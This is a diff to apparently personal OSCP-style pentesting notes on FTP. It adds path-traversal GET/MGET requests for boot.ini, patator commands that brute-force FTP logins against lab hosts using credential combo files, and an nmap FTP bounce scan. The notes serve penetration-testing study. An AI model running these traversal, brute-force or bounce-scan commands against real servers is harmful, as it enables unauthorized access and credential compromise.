@@ -33,6 +33,15 @@ proftpd.conf
 
 ## Common FTP Commands
 
+`send`
+
+```
+GET ../../../boot.ini
+GET ../../../../../../boot.ini
+MGET ../../../boot.ini
+MGET ../../../../../../boot.ini
+```
+
 | Command | Description  |
 | :------ | :----------- |
 | ? |	Request help |
@@ -59,3 +68,18 @@ proftpd.conf
 | pwd	| Find out the pathname of the current directory on the remote machine |
 | quit	| Exit the FTP environment (same as bye) |
 | rmdir	| Remove a directory in the current remote directory |
+
+
+## Bruteforcing 
+```
+patator ftp_login host=10.11.1.220 port=21 user=COMBO0 password=COMBO01 0=/root/oscp/lab-net2019/combo-creds.txt -x ignore:fgrep=’Login or password incorrect’
+
+patator ftp_login host=/root/oscp/lab-net2019/ftp-open.txt port=21 user=COMBO0 password=COMBO01 0=/root/oscp/lab-net2019/combo-creds.txt -x ignore:fgrep=’Login or password incorrect’
+
+patator ftp_login host=FILE0 port=21 user=COMBO0 password=COMBO1 0=/root/oscp/lab-net2019/ftp-open.txt 1=/root/oscp/lab-net2019/combo-creds.txt -x ignore:fgrep=’Login or password incorrect’ -x ignore:fgrep=’cannot log in.’ -x ignore:fgrep=’Login incorrect’ -l ftp_spray
+```
+
+## TCP FTP Bounce Scan
+```
+nmap –top-ports 1000 -vv -Pn -b anonymous:password@10.11.1.125:21 127.0.0.1
+```
